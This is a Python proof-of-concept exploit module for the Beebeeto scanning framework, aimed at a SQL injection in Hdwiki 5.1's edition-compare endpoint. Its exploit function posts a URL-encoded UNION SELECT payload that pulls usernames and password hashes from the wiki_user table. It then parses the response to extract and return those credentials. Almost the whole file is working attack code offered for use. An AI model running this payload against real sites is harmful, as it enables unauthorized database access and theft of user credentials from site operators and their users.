#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib
import urllib2
import urlparse

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0036',
            'name': 'Hdwiki 5.1 /control/edition.php SQL注入漏洞 Exploit',
            'author': 'foundu',
            'create_date': '2015-02-25',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Hdwiki',
            'vul_version': ['5.1'],
            'type': 'SQL Injection',
            'tag': ['Hdwiki漏洞', 'Hdwiki-SQL注入漏洞', '/control/edition.php', 'php'],
            'desc': '''
                    Hdwiki 5.1版本 /control/edition.php参数过滤不严谨导致的SQL注入漏洞
                    ''',
            'references': ['https://www.t00ls.net/thread-29305-1-1.html',
            ],
        },
    }


    @classmethod
    def exploit(cls, args):
        verify_url = '%s/index.php?edition-compare-1' % args['options']['target']
        payload = ("eid[0]=2&eid[1]=19&eid[2]=-1%29%20UNION%20SELECT%201%2C2%2C35"
                   "%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2Cmd5%28233%29%2Cusername%2C"
                   "password%2C14%2C15%2C16%2C17%2C18%2C19%20from%20wiki_user%23")
        headers_fake = {'Host': urlparse.urlparse(args['options']['target']).netloc,
                        'DNT': 1,}
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        req = urllib2.Request(url=verify_url, data=payload, headers=headers_fake)
        content = urllib2.urlopen(req).read()
        if 'e165421110ba03099a1c0393373c5b43' in content:
            try:
                username = re.findall(r'<li>内容长度:<label>(.*?)字</label>', content)[1]
                password = re.findall(r'图片<label>(.*?)个', content)[1]
            except:
                username, password = '', ''
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
            args['poc_ret']['post_content'] = payload
            args['poc_ret']['username'] = username.split('''\x00''')[0]
            args['poc_ret']['password'] = password[:32] 
        return args

    verify = exploit


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())